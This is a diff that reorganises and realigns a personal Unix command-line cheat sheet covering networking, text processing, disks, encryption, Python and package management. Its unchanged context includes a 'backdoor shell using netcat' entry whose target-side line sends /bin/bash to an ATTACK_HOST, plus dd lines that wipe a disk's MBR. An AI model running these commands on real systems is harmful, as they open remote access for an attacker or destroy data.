@@ -41,8 +41,11 @@ touch FILE                              # create empty file, if it doesn't exist
 pwd                                     # current directory
 pwd -P                                  # current directory, absolute path
 readlink -f PATH                        # absolute path (GNU only)
-cd $(dirname "$BASH_SOURCE") && pwd -P  # absolute path of sourced script
+cd                                      # change to home directory
+cd ..                                   # change to directory up
+cd DIR                                  # change to directory
 cd -                                    # return to previous directory
+cd $(dirname "$BASH_SOURCE") && pwd -P  # absolute path of sourced script
 lsof                                    # list open files
 
 # Find
@@ -122,51 +125,51 @@ edit /etc/resolv.conf
   > nameserver 141.213.13.31
 
 # Network Utilities
-ping google.com                    # Check if a host is up
-ping -c3 google                    # Only send 3 packets
-host www.google.com                # DNS lookup
-dig www.google.com                 # DNS lookup
-dig +short www.google.com          # DNS lookup, scriptable
-nslookup                           # DNS lookup
-nslookup -type=ns eecs.umich.edu   # DNS lookup with authortative name servers
-dig -x 141.212.106.7               # reverse DNS lookup
-dig +short -x 141.212.106.7        # reverse DNS lookup, scriptable
-whois www.google.com               # domain name registration info
-nmap -A -T4 snoopy.eecs.umich.edu  # what ports are open?
-netstat -at                        # list TCP connections
-netstat -au                        # list UDP connections
-netstat -ant                       # disable DNS lookup (faster)
-netstat -tl                        # listening TCP connections
-netstat -atn | grep ':22'          # how many ssh connections on this machine?
-netstat -l numeric-ports | grep 80 # what's using port 80?
-sudo fuser -v -n tcp 80            # who's using port 80?
-nc HOST PORT                       # intiate connection "cat over a socket"
-nc -l HOST PORT                    # listen for incoming connection
-nc -v HOST PORT                    # check connection to HOST on PORT
-wget https://www.google.com/       # download one page
-wget -m andrewdeorio.com           # download everything
-traceroute                         # print route packets take to network host
-curl --verbose                     # watch protocol in action
-curl --trace-ascii log.txt         # watch protocol in action, more detail
+ping google.com                         # Check if a host is up
+ping -c3 google                         # Only send 3 packets
+host www.google.com                     # DNS lookup
+dig www.google.com                      # DNS lookup
+dig +short www.google.com               # DNS lookup, scriptable
+nslookup                                # DNS lookup
+nslookup -type=ns eecs.umich.edu        # DNS with authortative name servers
+dig -x 141.212.106.7                    # reverse DNS lookup
+dig +short -x 141.212.106.7             # reverse DNS lookup, scriptable
+whois www.google.com                    # domain name registration info
+nmap -A -T4 snoopy.eecs.umich.edu       # what ports are open?
+netstat -at                             # list TCP connections
+netstat -au                             # list UDP connections
+netstat -ant                            # disable DNS lookup (faster)
+netstat -tl                             # listening TCP connections
+netstat -atn | grep ':22'               # ssh connections on this machine?
+netstat -l numeric-ports | grep 80      # what's using port 80?
+sudo fuser -v -n tcp 80                 # who's using port 80?
+nc HOST PORT                            # intiate connection "cat over a socket"
+nc -l HOST PORT                         # listen for incoming connection
+nc -v HOST PORT                         # check connection to HOST on PORT
+wget https://www.google.com/            # download one page
+wget -m andrewdeorio.com                # download everything
+traceroute                              # route packets take to network host
+curl --verbose                          # watch protocol in action
+curl --trace-ascii log.txt              # watch protocol in action, more detail
 curl --trace-ascii log.txt --trace-time # include timing
 curl --data "query=aa" http://localhost:5000/query # send POST request
 curl -H "Content-type: application/json" \         # POST JSON
      -X POST http://127.0.0.1:5000/ \
      -d '{"message":"Hello Data"}'
-telnet HOST 80                     # connect to web server
-tcpdump                            # watch packets on all network interfaces
-tcpdump -i eth0                    # watch packets on one network interface
-tcpdump tcp                        # only one protocol
-tcpdump port 80                    # only one port
-tcpdump host 1.2.3.4               # only one host
-tcpdump dst 1.2.3.4                # only one dest
-tcpdump src 1.2.3.4                # only one source
+telnet HOST 80                          # connect to web server
+tcpdump                                 # watch packets on all network ifcs
+tcpdump -i eth0                         # watch packets on one network interface
+tcpdump tcp                             # only one protocol
+tcpdump port 80                         # only one port
+tcpdump host 1.2.3.4                    # only one host
+tcpdump dst 1.2.3.4                     # only one dest
+tcpdump src 1.2.3.4                     # only one source
 tcpdump -S "tcp[tcpflags] & (tcp-syn|tcp-ack|tcp-fin) != 0" # 3-way handshake
 tcpdump -S "port 80 and (tcp[tcpflags] & (tcp-syn|tcp-ack|tcp-fin) != 0)" #  3-way handshake on port 80
 tcpdump -S "host web.eecs.umich.edu and port 80 and (tcp[tcpflags] & (tcp-syn|tcp-ack|tcp-fin) != 0)"   # 3-way handshake on port 80
-tcpdump -S -s0 -A port 80          # Sniff HTTP packets in ASCII format
-iftop                              # display bandwidth usage
-python -m SimpleHTTPServer 8000    # start a file server at ./ on port 8000
+tcpdump -S -s0 -A port 80               # Sniff HTTP packets in ASCII format
+iftop                                   # display bandwidth usage
+python -m SimpleHTTPServer 8000         # start a file server at ./ on port 8000
 
 # Backdoor shell using netcat
 # Note: this version of netcat (ncat) ships with nmap
@@ -180,7 +183,7 @@ ATTACK_HOST $ ncat -l -p 8080 -vv --ssl
 TARGET_HOST $ ncat -e /bin/bash ATTACK_HOST 8080 --ssl
 
 # Email
-sendmail user@example.com  < email.txt  # send email from CLI
+sendmail user@example.com < email.txt   # send email from CLI
 sendmail -t < email.txt                 # read "TO" field from file
 
 # Audio
@@ -208,9 +211,9 @@ ffmpeg -i input.mp4 -vcodec libx264 -vprofile baseline -preset slow -b:v 250k -m
 mogrify -rotate 90                     # rotate
 mogrify -resize 640x640                # reduce resolution
 exiftool                               # read all exif data
-exiftool '-AllDates+=3:02:00 00:00:00' photo.jpg  # date/time += 3 yr 2 mos
+exiftool '-AllDates+=3:02:00 00:00:00' # date/time += 3 yr 2 mos
 convert FILE.png FILE.jpg              # convert image file type
-convert FILE1.jpg -monochrome FILE2.jpg  # convert image to black and white
+convert IN.jpg -monochrome OUT.jpg     # convert image to black and white
 
 # SSH
 ssh HOST                               # connect to HOST
@@ -265,6 +268,22 @@ cd $(dirname "$BASH_SOURCE") && pwd -P  # absolute path of sourced script
 eval                                    # run in current shell
 exec                                    # spawn a new shell to replace current
 
+# Scripting
+yes                                     # keep printing "y" over and over
+yes | INSTALL_CMD                       # answer yes to all installer questions
+yes > file                              # quickly generate a big file
+exit N                                  # exit N
+true                                    # exit zero
+false                                   # exit non-zero
+trap FUNC 1 2 3 15                      # run FUNC on receiving a signal
+tee FILE                                # copy stdin to both stdout and FILE
+echo hello | tee FILE                   # write "hello" to both stdout and FILE
+mktemp                                  # create a temporary file
+mktemp -t PREFIX                        # ^^^ starting with PREFIX
+mktemp -d                               # create a temporary directory
+basename /bin/bash                      # returns "bash"
+dirname /bin/bash                       # return "/bin"
+
 # crontab format
  +---------------- minute (0 - 59)
  |  +------------- hour (0 - 23)
@@ -274,99 +293,108 @@ exec                                    # spawn a new shell to replace current
  |  |  |  |  |
  *  *  *  *  *  command to be executed
 
-# Check a disk with progress bar and no questions asked
-fsck -aC /dev/<device>
-touch /forcefsck && reboot  # force a filesystem check on reboot
-
 # grep
-grep -a -b -B100 -A100 phrase /dev/sda3 > file.txt  # recover deleted files
-egrep -o "\w+([._-]\w)*@\w+([._-]\w)*\.\w{2,4}" -e  # email addresses
-# grep for tab: In bash, as you are typing the quoted regular expression, hit Ctrl-V then the TAB key to get the TAB in there.
+grep PATTERN                            # search for pattern
+egrep PATTERN                           # extended regex
 grep -P                                 # Perl regex
+grep -o                                 # only print the matched pattern
+zgrep                                   # for .gz files
+grep -v                                 # invert match
+grep -A10                               # print match + 10 lines after
+grep -B10                               # print match + 10 lines before
+grep -a -b -B100 -A100 phrase /dev/sda3 # recover deleted files
+egrep -o "\w+([._-]\w)*@\w+([._-]\w)*\.\w{2,4}" -e  # email addresses
+# grep for tab in bash: Ctrl-V TAB
 
 # sed
-sed 1d        # print all but first line
-sed '$d'      # print all but last line
-sed -n '52p'  # print line number 52
-sed '52q;d'   # print line number 52, efficient on large files
-sed -n '45,50p' filename           # print line nos. 45-50 of a file
-sed -n '51q;45,50p' filename       # same, but executes much faster
-sed -i -e 's/before/after/g' file.txt  # replaces before with after
-perl -pi -e 's/old_string/new_string/g' <files> # the perl alternative
-echo abcd123 | sed 's/\([a-z]*\).*/\1/' # output "abcd" and delete the numbers
-sed -n '/BEGIN/,/END/p'  # print all lines between "BEGIN" and "END"
-sed 's/^/before/'       # prepend each line matching before"
-sed '/before/d'         # delete lines matching "before"
-sed -e '/before/q'      # print from beginning to line matching 'before'
-sed -nr 's/@@  ([0-9]+\.?[0-9]*) ns total time to execute/\1/p' 
-sed '1s/before/after/' FILE  # replace first line
+sed 1d                                  # print all but first line
+sed '$d'                                # print all but last line
+sed -n '52p'                            # print line 52
+sed '52q;d'                             # ^^^ efficient on large files
+sed -n '45,50p' filename                # print lines 45-50
+sed -n '51q;45,50p' filename            # ^^^ efficient on large files
+sed -n '/BEGIN/,/END/p'                 # print lines between "BEGIN" and "END"
+sed -e '/before/q'                      # stop when line matches "before"
+sed -i -e 's/before/after/g' file.txt   # replaces "before" with "after"
+perl -pi -e 's/old_string/new_string/g' # ^^^ perl alternative
+sed 's/\([a-z]*\).*/\1/'                # keep only lowercase letters
+sed 's/^/before/'                       # prepend each line matching "before"
+sed '/before/d'                         # filter lines matching "before"
+sed -nr 's/@@  ([0-9]+\.?[0-9]*) ns total time to execute/\1/p'
+sed '1s/before/after/'                  # replace first line
 FIXME: sed search and THEN do replace, e.g., '/searchterm/s/query/replace/'
 
 # awk
-echo -e '1\n2\n3' | awk '{ sum += $1 }; END { print sum }' # sum an input stream
-awk '/Iowa/,/Montana/' # print section of a file between two regex (inclusive)
-awk '{print $NF}'      # print last field
-awk '{$1="";print}'    # print all but last field
-awk '$1>=2{print}      # print if greater that 2
+awk '/Iowa/,/Montana/'                  # print lines between Iowa & Montana, 
+awk '{print $NF}'                       # print last field
+awk '{$1="";print}'                     # print all but last field
+awk '$1>=2{print}                       # print if greater that 2
+awk '{ sum += $1 }; END { print sum }'  # sum input stream
+awk '{print length}'                    # length of each line
 
 # Misc text processing
-cat FILE1              # print file to terminal
-cat FILE1 FILE2        # print files to terminal
-cat -n                 # prepend line numbers
-cut -c8-               # remove first 8 characters of a line
-fold                   # word-wrap text
-column -tns, FILE.csv  # pretty-print a csv file
-test `tail -c 1 file`  # test if file ends in newline
-expand                 # converts tabs into spaces
-tac                    # reverse order of lines
-rev                    # reverse order of characters
-cat FILE | sort | uniq -c # frequency analysis of lines (histogram)
-paste                  # print two files side-by-side
-tr "\r\n" "\n"  FILE   # convert line endings to UNIX
-cat FILE | tr -d -c ',\n' | awk '{print length}' # count commas
-shuf                   # shuffle lines in a file
-file FILE              # determine encoding of FILE
-iconv -f UTF-8 -t ASCII//TRANSLIT INFILE -o OUTFILE  # convert UTF8 to ASCII
-head                   # first 10 lines
-tail                   # last 10 lines
-tail -f                # monitor file for appends
-wc                     # word, line, character and byte count
-wc -l                  # line count
-sort | uniq            # print only uniq lines
+cat FILE1                               # print file to terminal
+cat FILE1 FILE2                         # print files to terminal
+cat -n                                  # prepend line numbers
+cut -c8-                                # remove first 8 characters of a line
+fold                                    # word-wrap text
+column -tns, FILE.csv                   # pretty-print a csv file
+test `tail -c 1 file`                   # test if file ends in newline
+expand                                  # converts tabs into spaces
+tac                                     # reverse order of lines
+rev                                     # reverse order of characters
+paste                                   # print two files side-by-side
+tr "\r\n" "\n"  FILE                    # convert line endings to UNIX
+fromdos                                 # convert line endings to UNIX
+dos2unix                                # convert line endings to UNIX (old)
+tr -d -c ',\n' | awk '{print length}'   # count commas
+shuf                                    # shuffle lines
+file FILE                               # determine encoding of FILE
+iconv -f UTF-8 -t ASCII//TRANSLIT       # convert UTF8 to ASCII
+head                                    # first 10 lines
+head -n2                                # first 2 lines
+head -n-2                               # all but last 2 lines
+tail                                    # last 10 lines
+tail -n2                                # last 2 lines
+tail -n+2                               # from from line 2 to end
+tail -f                                 # monitor file for appends
+wc                                      # word, line, character and byte count
+wc -l                                   # line count
+sort                                    # sort lines
+sort -n                                 # numeric order
+sort | uniq                             # print only unique lines
+/usr/share/dict/words                   # All the words in the dictionary
+shuf /usr/share/dict/words | head -n1   # random word
 
 # Printing
-lprm -P<printer>       # remove one job from queue
-lpq  -P<printer>       # show printer queue status
-lpstat -t              # show all status information for all printers
-cupsdisable <printer>  # stop printer
-cupsenable  <printer>  # start printer
-enscript FILE          # pretty-print text file
+enscript FILE                           # pretty-print text file
+lpr                                     # print file
+lprm -P<printer>                        # remove one job from queue
+lpq  -P<printer>                        # show printer queue status
+lpstat -t                               # show all status info for all printers
+cupsdisable <printer>                   # stop printer
+cupsenable  <printer>                   # start printer
+
+# Filesystems
+fsck -aC /dev/<device>                  # check disk with progress bar, no ?'s
+touch /forcefsck && reboot              # force filesystem check on reboot
+dd if=/dev/cdrom of=my_cd_image.iso     # Rip ISO from CDROM
+mount with "shortname=mixed"            # mount FAT32
+rsync -rvtP --modify-window=1 --delete  # copy from FAT32
+rsync -rv --delete --checksum           # copy from FAT32, using file checksum
 
 # Disk imaging over a network
 # create a backup of client to server
-server $ nc -p 2222 -l > client-sda.img
-client $ dd if=/dev/sda bs=16M | nc server.eecs.umich.edu 2222
-# restore backup from server on to client
-client $ nc -p 2222 -l > /dev/sda
-server $ dd if=client-sda.img bs=16M | nc client.umich.edu 2222
+SERVER $ nc -p 2222 -l > FILE.img                     # start backup, server
+CLIENT $ dd if=/dev/sda bs=16M | nc SERVER 2222       # start backup, client
+CLIENT $ nc -p 2222 -l > /dev/sda                     # start restore, client
+SERVER $ dd if=FILE.img bs=16M | nc CLIENT 2222       # start restore, server
 
 # Back up and restore MBR excluding partition table
 dd if=/dev/sda of=/home/herman/MBR.img bs=446 count=1 # backup MBR
 dd if=/home/herman/MBR.img of=/dev/sda bs=446 count=1 # restore MBR
 dd if=/dev/zero of=/dev/hda bs=446 count=1            # kill MBR, except table
 dd if=/dev/zero of=/dev/hda bs=512 count=1            # kill ENTIRE MBR
-
-# Rip ISO from cdrom
-dd if=/dev/cdrom of=my_cd_image.iso
-
-# All the words in the dictionary
-/usr/share/dict/words
-shuf /usr/share/dict/words | head -n1   # random word
-
-# copying to/from FAT32
-mount with "shortname=mixed"            # mount FAT32
-rsync -rvtP --modify-window=1 --delete  # copy
-rsync -rv --delete --checksum           # copy, using file checksum
 
 # Permissions
 chown USER                              # change owner
@@ -388,43 +416,37 @@ find . -type d -exec chmod 700 {}\;     # change permissions for dirs only
 umask                                   # view mask for default file permissions
 
 # AFS
-kdestroy                                  # delete Kerberos tickets
-unlog                                     # delete AFS tokens
-kinit [-5] [-l 30d] [awdeorio@UMICH.EDU]  # get Kerberos ticket
-aklog                                     # get AFS tokens
-aklog -cell umich.edu -k UMICH.EDU        # AFS tokens for UMICH cell
-aklog -cell eecs.umich.edu -k UMICH.EDU   # AFS tokens for EECS cell
-gssklog -cell engin.umich.edu             # AFS tokens for ENGIN cell
-fs setacl -dir DIR -acl USER rlidwk       # give USER access to directory
-find DIR -type d -exec fs setacl -dir {} -acl USER rlidwk \;
-  # give USER access to DIR, recursively
-find DIR -type d -exec fs setacl -dir {} -acl USER rlidwka \;
-  # give USER access to DIR, recursively, with admin (note the "a")
-fs setacl -dir DIR -acl USER rlidwk # give USER permission to DIR
+kdestroy                                # delete Kerberos tickets
+unlog                                   # delete AFS tokens
+kinit [-5] [-l 30d] [awdeorio@UMICH.EDU]# get Kerberos ticket
+aklog                                   # get AFS tokens
+aklog -cell umich.edu -k UMICH.EDU      # AFS tokens for UMICH cell
+aklog -cell eecs.umich.edu -k UMICH.EDU # AFS tokens for EECS cell
+gssklog -cell engin.umich.edu           # AFS tokens for ENGIN cell
+fs setacl -dir DIR -acl USER rlidwk     # give USER access to directory
+find DIR -type d -exec fs setacl -dir {} -acl USER rlidwk \;  # give USER access to DIR, recursively
+find DIR -type d -exec fs setacl -dir {} -acl USER rlidwka \; # give USER access to DIR, recursively, with admin (note the "a")
 
 # NFS
 showmount -e 192.168.0.100              # see what's available
-mount 192.168.0.100:/volume1/public nas # mount it
+mount 192.168.0.100:/volume1/public nas # mount NFS volume
 
 # Hardware and detection
-top                                                # current memory usage
-free                                               # memory only
-cat /proc/cpuinfo                                  # CPU only
-lspci                                              # see PCI devices
-hwinfo                                             # all hardware
-xinput --list                                      # see available input devices
-xinput --test "AlpsPS/2 ALPS GlidePoint"           # test the device
-xinput --list-props "AlpsPS/2 ALPS GlidePoint"     # see what one device can do
-xinput --set-prop "AlpsPS/2 ALPS GlidePoint" 121 1 # change a property
+top                                     # current memory usage
+free                                    # memory only
+cat /proc/cpuinfo                       # CPU information
+cat /proc/meminfo                       # Memory information
+lspci                                   # see PCI devices
+hwinfo                                  # all hardware
+xinput --list                           # see available input devices
 
 # Converting docs
-xlhtml - convert excel files
-tofrodos
-antiword
-ppthtml - ppt file to html
 enscript FILE.txt -o - | ps2pdf - FILE.pdf  # txt to pdf
-pdftk PATH/*.pdf cat output output.pdf  # merge pages
-pdftk FILE.pdf burst                    # explode pages
+fromdos                                 # convert line endings to UNIX
+dos2unix                                # convert line endings to UNIX (old)
+pdftk PATH/*.pdf cat output output.pdf  # join pages
+pdftk FILE.pdf burst                    # split pages
+xlhtml - convert excel files
 
 # Date and time
 date '+%s'                                        # current time in seconds
@@ -435,21 +457,24 @@ TZ='America/Detroit'; export TZ                   # change time zone
 ntpdate europe.pool.ntp.org north-america.pool.ntp.org # sync clock
 
 # GNU parallel
-parallel --verbose                      # print cmd before executing it
-parallel -v                             # print cmd+output after executing it
 ls *.tar.gz | parallel -v -j3 tar -xvzf # untar, 3 jobs in parallel
 ls *.tar.gz | xargs -P3 tar -xvzf       # alternative using xargs
+parallel --verbose                      # print cmd before executing it
+parallel -v                             # print cmd+output after executing it
 parallel -j+0                           # untar, use all CPUs
 */ -d | sed 's_/$__' | parallel -v -j+0 tar -cjf {}.tar.bz2 {}/ # create tar
 killall -USR1 parallel                  # get list of running jobs
 killall -TERM parallel                  # finish running jobs, no new jobs
-echo >jobqueue; tail -f jobqueue | parallel  # start job queue
-echo my_command my_arg >> jobqueue           # submit to job queue
+echo > q; tail -f q | parallel          # start job queue
+echo my_command my_arg >> q             # submit to job queue
 
-
-# Patch
-cd src/drivers/input/mouse
-patch < patch-dell-e6510
+# File differences
+diff file1 file2                        # view differences of two files
+diff <(echo a) <(echo b)                # diff the output of two commands (bash)
+diff3 file1 file2 file3                 # diff three files
+sdiff                                   # same as diff --side-by-side
+diff file1 file2 > patch.txt            # save a patch
+patch < patch-dell-e6510                # apply a patch from diff
 
 # Shell math
 expr 1 / 2                              # integer only
@@ -460,6 +485,7 @@ sort file1 | uniq                       # unique patterns
 sort file1 file2 | uniq                 # union
 sort file1 file2 | uniq -d              # intersection
 sort file1 file2 | uniq -u              # symmetric difference
+cat FILE | sort | uniq -c               # frequency analysis (histogram)
 
 # Compression
 tar -cjf DIR.tar.bz2 DIR/               # compress directory
@@ -478,51 +504,24 @@ zgrep FILE.gz                           # grep for compressed files
 zdiff FILE1.gz FILE2.gz                 # diff for compressed files
 cat FILE.txt | gzip -f > FILE.txt.gz    # pipe into gzip
 
-# C++ tools
-g++ -g                                  # compile with debug support
-valgrind -v --leak-check=full ./a.out   # check for memory errors
-LIBARY_PATH                             # environment vars for tool installs
-LD_LIBRARY_PATH
-LD_RUN_PATH
-CPATH
-C_INCLUDE_PATH
-CPLUS_INCLUDE_PATH
-MANPATH
-
 # Encryption
-encfs ROOTDIR MOUNTPOINT   # (first time) create encrypted virtual folder
-encfs ROOTDIR MOUNTPOINT   # mount
-fusermount -u MOUNTPOINT   # unmount / Linux
-umoount MOUNTPOINT         # unmount / Darwin
-encfsctl passwd ROOTDIR    # change password
-md5sum                     # compute hash
-md5sum -                   # enter some text, then CTRL-D for random passwd
-shasum                     # compute hash
-gpg                        # encrypt/decrypt text file
-openssl                    # command line interface to OpenSSL library
-crypto FILE                # encrypt to FILE.crypt
-decrypto FILE.crypt        # decrypt to FILE
-
-# Scripting
-yes                        # keep printing "y" over and over
-yes | INSTALL_CMD          # answer yes to all installer questions
-yes > file                 # quickly generate a big file
-exit N                     # exit N
-true                       # exit zero
-false                      # exit non-zero
-trap FUNC 1 2 3 15         # run FUNC (or command) on receiving a signal
-tee FILE                   # copy stdin to both stdout and FILE
-echo hello | tee FILE      # write "hello" to both stdout and FILE
-mktemp                     # create a temporary file
-mktemp -t PREFIX           # create temporary file starting with PREFIX
-mktemp -d                  # create a temporary directory
-basename /bin/bash         # returns "bash"
-dirname /bin/bash          # return "/bin"
+encfs ROOTDIR MOUNTPOINT                # (first time) create encrypted virtual folder
+encfs ROOTDIR MOUNTPOINT                # mount
+fusermount -u MOUNTPOINT                # unmount / Linux
+umoount MOUNTPOINT                      # unmount / Darwin
+encfsctl passwd ROOTDIR                 # change password
+md5sum                                  # compute hash
+md5sum -                                # random password: type, then CTRL-D
+shasum                                  # compute hash
+gpg                                     # encrypt/decrypt text file
+openssl                                 # CLI to OpenSSL library
+crypto FILE                             # encrypt to FILE.crypt
+decrypto FILE.crypt                     # decrypt to FILE
 
 # Serial ports
-dmesg                      # devices connected recently, e.g., /dev/tty...
-screen /dev/ttyACM0 9600   # text input/output at 9600 Baud
-                           #   Ctrl-A,Shift-K to quit
+dmesg | grep /dev/tty                   # recently connected devices
+screen /dev/ttyACM0 9600                # text input/output at 9600 Baud
+                                        #   Ctrl-A,Shift-K to quit
 # Virtual terminals
 screen                     # start virtual terminal
 screen -S NAME             # start virtual terminal named NAME
@@ -545,15 +544,6 @@ watch CMD                  # run CMD over and over
 watch -n0.5 CMD            # run CMD every 0.5s
 tail -f FILE               # watch file for appends
  ... | xargs CMD           # run CMD on each line of input
-
-# Controlling mouse setting in X
-xinput                               # list devices
-xinput watch-props "DualPoint Stick" # list settings for one device
-xinput set-prop "DualPoint Stick" "Device Accel Profile" 2 # change setting
-xinput set-prop "DualPoint Stick" 247 2
-xinput set-prop "DualPoint Stick" 248 2
-xinput set-prop "DualPoint Stick" 249 2
-xinput set-prop "DualPoint Stick" 250 10
 
 # Mount CD/DVD image
 mount -o loop file.img /home/awdeorio/mnt/loop
@@ -597,6 +587,7 @@ brew cleanup                            # remove tarballs, installers, etc.
 brew cask cleanup                       # remove .dmg installers
 brew linkapps                           # link to /Applications/
 
+
 ########################################
 # Other Linux Distros
 
@@ -605,14 +596,13 @@ brew linkapps                           # link to /Applications/
 /usr/portage/profiles/use.local.desc
 
 # Redhat:rpm
-rpm -Uvh foo-1.0-1.i386.rpm  # install a package
+rpm -Uvh foo-1.0-1.i386.rpm             # install a package
 rpm -ev foo.rpm
-## compile and install a package from source (*.src.rpm)
-rpm -ivh source-package  # installs the source in /usr/src/redhat/SOURCES
-                         # installs the spec file in /usr/src/redhat/SPECS.
-rpmbuild -bb thing.spec  # build rpm
-rpm -Uvh     thing.rpm   # install rpm
-rpm2cpio FILE.rpm | cpio -idmv # extra files from rpm
+rpm -ivh source-package                 # install src in /usr/src/redhat/SOURCES
+                                        # install spec in /usr/src/redhat/SPECS
+rpmbuild -bb thing.spec                 # build rpm
+rpm -Uvh     thing.rpm                  # install rpm
+rpm2cpio FILE.rpm | cpio -idmv          # extra files from rpm
 
 # Debian/Ubuntu apt
 apt-get update                          # update repository
@@ -622,10 +612,29 @@ apt-cache search <package>              # find packages
 apt-cache showpkg <package>             # get the details on a package
 
 # /etc/init.d/ scripts
-update-rc.d -f autofs remove # Ubuntu, remove
-update-rc.d autofs defaults  # Ubuntu, add
-chkconfig autofs off         # FC/Redhat
-rc-update del autofs         # Gentoo
+update-rc.d -f autofs remove            # Ubuntu, remove
+update-rc.d autofs defaults             # Ubuntu, add
+chkconfig autofs off                    # Fedora/Redhat
+rc-update del autofs                    # Gentoo
+
+
+########################################
+# C++ tools
+g++ -g                                  # compile with debug support
+valgrind -v --leak-check=full ./a.out   # check for memory errors
+g++ -pg                                 # compile with profiling support
+gprof EXE gmon.out > analysis.txt       # profile
+g++ -g --coverage FILE.cpp              # coverage: compile
+./a.out                                 # coverage: run
+gcov FILE.cpp                           # coverage: analyze
+cat test.cpp.gcov | grep '^#####'       # coverage: lines that didn't execute
+LIBARY_PATH                             # environment vars for tool installs
+LD_LIBRARY_PATH
+LD_RUN_PATH
+CPATH
+C_INCLUDE_PATH
+CPLUS_INCLUDE_PATH
+MANPATH
 
 
 ########################################
@@ -644,8 +653,14 @@ cpan -i PACKAGE                         # install package
 ########################################
 # Python
 
-# Add this to source code to drop to a debugger
-import pdb; pdb.set_trace();
+# local package installs
+virtualenv ./venv                       # create
+. ./venv/bin/activate                   # enable
+pip install PACKAGE                     # install PACKAGE into ./venv
+deactivate                              # disable
+
+# Stop and debug
+>>> import pdb; pdb.set_trace();
 
 # Start a program in debug mode
 python -m pdb script.py
@@ -659,10 +674,10 @@ pylint -rn                              # Disable full report (only messages)
 import readline, rlcompleter
 readline.parse_and_bind("tab: complete")
 
-# Start an IPython Notebook server on a remote server
-ipython notebook --ip 0.0.0.0 --no-browser
+# Start a Jupyter (formerly IPython) Notebook server on a remote server
+jupyter-notebook --ip 0.0.0.0 --no-browser
 
-# Execute an IPython Notebook in headless mode.  Clears all output, runs the 
+# Execute a Jupyter Notebook in headless mode.  Clears all output, runs the 
 # entire notebook, and writes the result to an output .ipynb file
 # NOTE: `ipython nbconvert` is buggy and incorrectly times out long jobs
 pip install runipy
@@ -674,12 +689,6 @@ ipython nbconvert --to=notebook --ClearOutputPreprocessor.enabled=True --Execute
 export PYTHONPATH=${HOME}/local/lib/python2.6:${PYTHONPATH}
 export PYTHONUSERBASE=${HOME}/local
 
-# set up local package installs
-virtualenv ./venv                       # create
-. ./venv/bin/activate                   # enable
-pip install PACKAGE                     # install PACKAGE
-deactivate                              # disable
-
 # Quick web server serving files in PWD on port 8000
 python -m SimpleHTTPServer 
 
@@ -687,24 +696,25 @@ python -m SimpleHTTPServer
 >>> import sh
 >>> ls('-l')
 
-# Build a distribution tarball
-python setup.py sdist
 
 ####################
 # PyPI howto
 # ref http://peterdowns.com/posts/first-time-with-pypi.html
 # NOTE: for some stupid reason, you *must* have your password in ~/.pypirc
 
-# Release
+# Build a distribution tarball locally
+python setup.py sdist
+
+# Tag a release
 git tag -a X.Y
 git push --tags origin master
 
-# Test
+# Test deploy to PyPI
 python setup.py register -r pypitest
 python setup.py sdist upload -r pypitest
 open https://testpypi.python.org/pypi/MYPACKAGE/
 
-# Live
+# Live deploy to PyPI
 python setup.py register -r pypi
 python setup.py sdist upload -r pypi
 
